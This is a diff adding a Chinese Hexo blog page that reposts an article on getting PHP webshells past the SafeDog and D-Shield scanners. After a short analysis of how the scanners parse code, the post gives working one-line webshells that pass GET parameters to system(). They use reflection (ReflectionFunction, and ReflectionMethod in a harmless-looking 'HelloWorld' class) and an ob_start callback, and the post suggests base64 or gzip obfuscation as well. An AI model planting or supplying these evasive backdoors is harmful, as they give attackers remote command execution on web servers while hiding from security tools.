@@ -1,0 +1,794 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="bypass," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta name="keywords" content="bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="过狗总结（转）">
+<meta property="og:url" content="http://sunu11.com/2016/11/05/5/index.html">
+<meta property="og:site_name" content="SuNu11&#39;Blog">
+<meta property="og:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-03-21T05:43:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="过狗总结（转）">
+<meta name="twitter:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'SuNu11'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sunu11.com/2016/11/05/5/"/>
+
+
+
+
+
+  <title> 过狗总结（转） | SuNu11'Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SuNu11'Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guide">
+          <a href="/Guide/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            航海图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2016/11/05/5/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="SuNu11">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/me.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="SuNu11'Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="SuNu11'Blog" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                过狗总结（转）
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-11-05T13:31:28+08:00">
+                2016-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/shell/" itemprop="url" rel="index">
+                    <span itemprop="name">shell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/2016/11/05/5/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/05/5/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p> </p><h3>xx狗静态查杀大致分析</h3><p>目前，传统的WAF软件主要通过定时或是由管理员手动对网站<a id="more"></a>程序进行查杀的主动方式以及当请求者浏览该文件时由WAF软件被动的方式进行查杀。而查杀的原理主要是通过对目标文件的特征与网马规则库进行比对。这种查杀原理有它的局限性，攻击者可以利用脚本语言的特性对已被查杀出来的WebShell进行伪装成类似正常的页面程序从而避开WAF软件的查杀。</p><p>因为狗的查杀并没有相关资料或文档等。不过，我们仍然可以从狗的查杀中得到部分结论。<br></p><ul><li>利用正则表达式<br></li></ul><p>这种方法最大的好处就是简单。但是，正则表达式最大的缺点就是其只对关键危险函数进行检查。也就是说，我们将关键函数稍微通过某种方式变换一下，正则表达式无法查杀了。而且，这种方法的误报率也很高。所以，这种方法的查杀效果不是很理想。但是这种方法最大的好处就是简单，速度快。一般在查杀web目录下的图片等文件时使用此种方法。</p><li>利用PHP代码分析技术<br></li><p>这种方法最大的好处是解决了正则查杀误报率过高的问题。在这里，我们可以大致分析一下查杀引擎的工作原理：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对PHP文件做预处理，去除掉注释，空格，等没有用的东西</p><p>我们可以在php中写入以下内容</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/<em>system(“$_get[‘x’]”);
+</em>/</span><span class="hljs-meta">?&gt;</span></code></pre><p>使用和d盾查杀，发现没有查杀出一句话。原来查杀引擎在查杀的时候，会做类似于编译器的优化，去掉一些乱七八糟的东西。也许你会认为代码写在注释里，php的编译器也会做类似优化操作，将其去除。而且，代码在注释里也不可能运行的。所以你可能会认为的查杀方式很正确。既简单又高效，为下一步处理降低了负担。</p><p>但是其实是不正确的。查阅php manual，在PHP 5 &gt;= 5.1.0, PHP 7 中，php官方提供了一个函数<span style="font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 1em;">ReflectionClass::getDocComment。</span>简而言之，这个函数最主要的作用是获取php的注释。我们可以通过这个函数获取文档中注释，然后通过php的动态函数调用等xxxx各种方法去执行我们所获取到的代码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步预处理所得到的结果做词法分析。以下代码</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">$a=<span class="hljs-string">“system(@$_get[‘x’])”</span></code></pre><p>和</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">system(@$_get[<span class="hljs-string">‘x’</span>])</code></pre><p>我们分别去查杀这两个文件。结果显而易见，第一个没有办法去查杀，而第二个一定会被查杀。由此，我们可以得出结论，查杀引擎会对php文件做词法分析，然后只对相关函数调用等再做进一步查杀。而类似于字符串等这样变量，查杀引擎基本上会直接将其舍弃。不再做进一步分析。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步结果进行语法分析</p><p>从这一步开始，查杀引擎开始对相关函数的调用进行语法分析。分析变量作用域，函数参数调用等。再与webshell特征库进行比对，用以确定是否为webshell文件。</p><p>在查杀引擎中，基本上会对if等条件控制条件直接跳过，直接分析里面的代码。例如下面的例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">false</span>)<br>  {<br>    system(<span class="hljs-string">‘@$_get[‘</span>x<span class="hljs-string">‘]’</span>);<br>}</code></pre><p>这段代码在php文件进行编译的时候，会对其进行分支优化。也就是说，这段代码因为if语句中为false，属于死码，永远不会运行，所以编译器会将其删除掉。但是换做查杀引擎，会直接查杀并报警。据我猜测，php的控制流程跳转那么多，如果查杀引擎也像编译器那样做分支结构的优化，势必会造成查杀效率的降低。所以没办法，只好不管分支结构，直接查杀。</p><h3>躲避查杀的方法</h3><p>上面大致介绍了两种查杀引擎的办法，虽然比较粗略，但是也给了我们躲避查杀的思路。那就是，想办法隐藏关键的特征码。</p><ul><li>利用php反射技术</li></ul><p>反射是在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p><p>也就是说，我们可以利用反射去加载system函数，通过反射去传参。因为在反射中，system这个特征码只不过是字符串，所以我们很容易对其进行加解密等操作去躲开查杀引擎的查杀。</p><p>过狗例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$func = <span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">“system”</span>);<br><span class="hljs-keyword">echo</span> $func-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">“$_GET[c]”</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>这个安全狗查不到，但是d盾可以查到，而d盾查杀结果是可疑函数调用，基本上等于没查到。下面来一段d盾和都查不到的shell</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>{<p></p>
+<p>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHelloTo</span><span class="hljs-params">($name)</span> </span>{<br>      $last_line = system($name);<br>              <span class="hljs-keyword">return</span> $last_line;<br>  }<br>}<br>$a=$_GET[<span class="hljs-string">“a”</span>];<br>$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">‘HelloWorld’</span>, <span class="hljs-string">‘sayHelloTo’</span>);<br><span class="hljs-keyword">echo</span> $reflectionMethod-&gt;invoke(<span class="hljs-keyword">new</span> HelloWorld(), $a);<br><span class="hljs-meta">?&gt;</span><br></p></code></pre><p>利用反射类中函数的办法去执行危险函数</p><ul><li>利用php的callback方法<br></li></ul><p>自 PHP 5.4 起可用 <a href="http://php.net/manual/zh/language.types.callable.php" target="_blank" rel="external">callable</a>&nbsp;类型指定回调类型 callback。本文档基于同样理由使用 <a href="#language.types.callback">callback</a>&nbsp;类型信息。一些函数如 <a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="external">call_user_func()</a>&nbsp;或 <a href="http://php.net/manual/zh/function.usort.php" target="_blank" rel="external">usort()</a>&nbsp;可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。也就是说，callback也可以接受一个字符串变量，并将其作为函数去执行。下面是例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$cb= <span class="hljs-string">‘system’</span>;ob_start($cb);<span class="hljs-keyword">echo</span> $_GET[c];ob_end_flush();<span class="hljs-meta">?&gt;</span></code></pre><p>在php中回调函数有很多，打开php的官方手册，找到支持callback的函数，基本上都可以用来做过狗一句话</p><ul><li>特征码的变形隐藏<br></li></ul><p>在上面的例子中，我们已经成功的将函数调用转换为字符串类型，然后通过反射等方式去执行。但是我们还需要躲避正则匹配等查杀引擎，这里还需要对特征码变形。当然了，这里变形的操作就很多了，例如base64加密，gzip压缩，或者，也可以自己写一段加解密字符串的函数。这里就不详细介绍了。</p><p>过狗的例子有很多，这里只不过给出思路。php作为一门弱类型的语言，可扩展性，灵活性比java一类等语言强很多。但是过于灵活也会导致很多安全问题。在静态查杀中，很容易躲避查杀，造成漏报等问题。所以在安全狗的博客中，也讲了静态查杀不太靠谱，还是防御好黑客上传shell才是正道，使其没有上传webshell的机会。</p><p>初次写文章，有些地方可能会有技术上的问题，望大牛斧正批评。也望各路大神交流过狗思路，共同学习进步。</p><p>参考资料</p><p></p><ul><li><a href="http://blog.safedog.cn/?p=77" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://blog.safedog.cn/?p=77</a>&nbsp; &nbsp; &nbsp; 一种理想的网站木马防护思路探究<br></li><li><a href="http://php.net/manual/zh/language.types.callable.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://php.net/manual/zh/language.types.callable.php</a>&nbsp; &nbsp; &nbsp; &nbsp; phpcallback<br></li><li><a href="https://secure.php.net/manual/zh/reflectionfunction.invoke.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://secure.php.net/manual/zh/reflectionfunction.invoke.php</a>&nbsp;php &nbsp; 反射<br></li><li><a href="https://security.tencent.com/index.php/blog/msg/58" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/58</a>&nbsp;TSRC<br></li><li>挑战赛： PHP防御绕过挑战实录<br></li><li><a href="http://wrox.cn/article/100032494/" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://wrox.cn/article/100032494/</a>&nbsp;未知攻焉知防 — Webshell变形技术集锦<br></li></ul><p></p><p><font face="Times New Roman" size="2">文／烤土豆啦（简书作者）原文链接：<a href="http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。" target="_blank" rel="external">http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。</a></font></p><p><br></p><p><br></p><p></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div align="center">
+ 
+   <div class="">
+   <p><span>
+   <b>本文地址：</b><a href="/2016/11/05/5/" title="过狗总结（转）">http://sunu11.com/2016/11/05/5/</a><br/><b>转载请注明出处，谢谢！</b>
+   </span></p>
+   </div>
+ 
+  </div>
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.png" alt="SuNu11 Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag"># bypass</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/30/3/" rel="next" title="OpenStack云计算平台初体验">
+                <i class="fa fa-chevron-left"></i> OpenStack云计算平台初体验
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/11/05/4/" rel="prev" title="sqlmap总结（1）">
+                sqlmap总结（1） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/11/05/5/"
+           data-title="过狗总结（转）" data-url="http://sunu11.com/2016/11/05/5/">
+      </div>
+    
+  </div>
+    
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.png"
+               alt="SuNu11" />
+          <p class="site-author-name" itemprop="name">SuNu11</p>
+          <p class="site-description motion-element" itemprop="description">淡泊以明志，宁静以致远</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives/index.html">
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://mooder.f4ck0.com:8000/" target="_blank" title="Team Spaces">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Team Spaces
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/sunu11" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/sunu11" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sec-redclub.com/" title="Redbu11" target="_blank">Redbu11</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://dbqf.xyz/" title="独步清风" target="_blank">独步清风</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.virzz.com/" title="Virink" target="_blank">Virink</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.monburan.cn/" title="Monburan" target="_blank">Monburan</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">xx狗静态查杀大致分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">躲避查杀的方法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SuNu11</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a>Hexo</a>&nbsp&nbsp&nbsp&nbsp<a href="http://www.miitbeian.gov.cn" target="_blank" title="备案信息">京ICP备16045158号</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>&nbsp&nbsp&nbsp&nbsp<a href="http://www.cnzz.com/stat/website.php?web_id=4481618" target="_blank" title=" 站长统计">站长统计</a>
+</div>
+<br>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"sunu11"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+</body>
+</html>
